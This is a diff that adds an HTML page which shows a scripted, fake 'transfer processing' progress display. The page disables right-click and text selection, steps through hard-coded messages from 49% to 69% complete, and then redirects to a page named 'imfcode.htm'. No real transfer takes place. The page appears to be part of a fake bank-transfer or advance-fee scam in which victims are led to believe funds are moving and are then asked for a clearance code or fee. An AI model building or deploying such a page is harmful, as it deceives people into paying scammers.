@@ -1,0 +1,145 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0082)-->
+<html><head><meta content="IE=5.0000" http-equiv="X-UA-Compatible">
+<title>Processing Transfer....</title> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="GENERATOR" content="MSHTML 11.00.9600.17037"></head> 
+<body ondragstart="return false" onselectstart="return false" oncontextmenu="return false" text="#ffffff" bgcolor="#000000">
+<div id="splashcontainer" style="width: 350px; position: absolute; left: 545px; top: 351px; visibility: visible;"><b><center><font size="3" face="BANK GOTHIC">YOUR TRANSFER DATA IS BEING PROCESSED</font></center></b></div><layer id="splashcontainerns" width="450"></layer> 
+<script>
+
+var preloadimages=new Array("http://abstract.simplenet.com/point.gif","http://abstract.simplenet.com/point2.gif")
+
+var intervals=3000
+//configure destination URL
+var targetdestination="imfcode.htm"
+
+
+var splashmessage=new Array()
+var openingtags='<font face="BANK GOTHIC" size="3">'
+splashmessage[0]='TRANSFER FORM SUBMITTED'
+splashmessage[1]='PLEASE WAIT..............'
+splashmessage[2]='YOUR TRANSFER DATA IS BEING PROCESSED'
+splashmessage[3]='YOUR TRANSFER DATA IS BEING PROCESSED'
+splashmessage[4]='TRANSFER DATA PROCESSED'
+splashmessage[5]='INITIATING TRANSFER'
+splashmessage[6]='49%.......OF TRANSFER COMPLETED'
+splashmessage[7]='50%.......OF TRANSFER COMPLETED'
+splashmessage[8]='51%.......OF TRANSFER COMPLETED'
+splashmessage[9]='52%.......OF TRANSFER COMPLETED'
+splashmessage[10]='53%.......OF TRANSFER COMPLETED'
+splashmessage[11]='54%.......OF TRANSFER COMPLETED'
+splashmessage[12]='55%.......OF TRANSFER COMPLETED'
+splashmessage[13]='56%.......OF TRANSFER COMPLETED'
+splashmessage[14]='57%.......OF TRANSFER COMPLETED'
+splashmessage[15]='58%.......OF TRANSFER COMPLETED'
+splashmessage[16]='59%.......OF TRANSFER COMPLETED'
+splashmessage[17]='60%.......OF TRANSFER COMPLETED'
+splashmessage[18]='61%.......OF TRANSFER COMPLETED'
+splashmessage[19]='62%.......OF TRANSFER COMPLETED'
+splashmessage[20]='63%.......OF TRANSFER COMPLETED'
+splashmessage[21]='64%.......OF TRANSFER COMPLETED'
+splashmessage[22]='65%.......OF TRANSFER COMPLETED'
+splashmessage[23]='66%.......OF TRANSFER COMPLETED'
+splashmessage[24]='67%.......OF TRANSFER COMPLETED'
+splashmessage[25]='68%.......OF TRANSFER COMPLETED'
+splashmessage[26]='69%.......OF TRANSFER COMPLETED'
+
+var closingtags='</font>'
+
+//Do not edit below this line (besides HTML code at the very bottom)
+
+var i=0
+
+var ns4=document.layers?1:0
+var ie4=document.all?1:0
+var ns6=document.getElementById&&!document.all?1:0
+var theimages=new Array()
+
+//preload images
+if (document.images){
+for (p=0;p<preloadimages.length;p++){
+theimages[p]=new Image()
+theimages[p].src=preloadimages[p]
+}
+}
+
+function displaysplash(){
+if (i<splashmessage.length){
+sc_cross.style.visibility="hidden"
+sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'
+sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 : document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2
+sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2 : document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2
+sc_cross.style.visibility="visible"
+i++
+}
+else{
+window.location=targetdestination
+return
+}
+setTimeout("displaysplash()",intervals)
+}
+
+function displaysplash_ns(){
+if (i<splashmessage.length){
+sc_ns.visibility="hide"
+sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')
+sc_ns.document.close()
+
+sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2
+sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2
+
+sc_ns.visibility="show"
+i++
+}
+else{
+window.location=targetdestination
+return
+}
+setTimeout("displaysplash_ns()",intervals)
+}
+
+
+
+function positionsplashcontainer(){
+if (ie4||ns6){
+sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer
+displaysplash()
+}
+else if (ns4){
+sc_ns=document.splashcontainerns
+sc_ns.visibility="show"
+displaysplash_ns()
+}
+else
+window.location=targetdestination
+}
+window.onload=positionsplashcontainer
+
+</script>
+ 
+<div align="right"></div>
+<script><!--
+ var jv=1.0;
+//--></script>
+ 
+<script language="Javascript1.1"><!--
+ jv=1.1;
+//--></script>
+ 
+<script language="Javascript1.2"><!--
+ jv=1.2;
+//--></script>
+ 
+<script language="Javascript1.3"><!--
+ jv=1.3;
+//--></script>
+ 
+<script language="Javascript1.4"><!--
+ jv=1.4;
+//--></script>
+ <noscript>&lt;IMG height=1 src="sitestats.gif"  width=1&gt;</noscript> 
+<p align="center">&nbsp;</p>
+<p align="center">&nbsp;</p>
+<p align="center"><img src="images/loading.gif" width="320" height="320" border="0"></p>
+</body></html>
